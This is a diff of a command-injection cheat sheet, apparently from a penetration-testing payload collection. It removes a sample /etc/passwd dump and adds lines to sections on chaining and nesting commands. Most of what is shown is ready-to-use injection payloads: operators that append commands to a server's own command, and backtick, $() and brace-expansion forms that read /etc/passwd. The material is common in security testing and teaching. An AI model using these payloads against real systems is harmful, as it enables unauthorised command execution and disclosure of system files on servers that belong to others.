@@ -14,28 +14,23 @@ https://www.owasp.org/index.php/Command_Injection
 
 
 # Exploits
-## Basic commands
 
-Execute the command and voila :p
-````
-cat /etc/passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-bin:x:2:2:bin:/bin:/bin/sh
-sys:x:3:3:sys:/dev:/bin/sh
-````
-## Chaining commands
+
+## Chaining commands Ux
 ````
 original_cmd_by_server; ls
 original_cmd_by_server && ls
 original_cmd_by_server | ls
 original_cmd_by_server || ls    Only if the first cmd fail
 ````
+
 ## Inside a command
 ````
 original_cmd_by_server `cat /etc/passwd`
 original_cmd_by_server $(cat /etc/passwd)
+original_cmd_by_server {cat,/etc/passwd}
 ````
+
 # Filter Bypasses
 ## Bypass without space
 
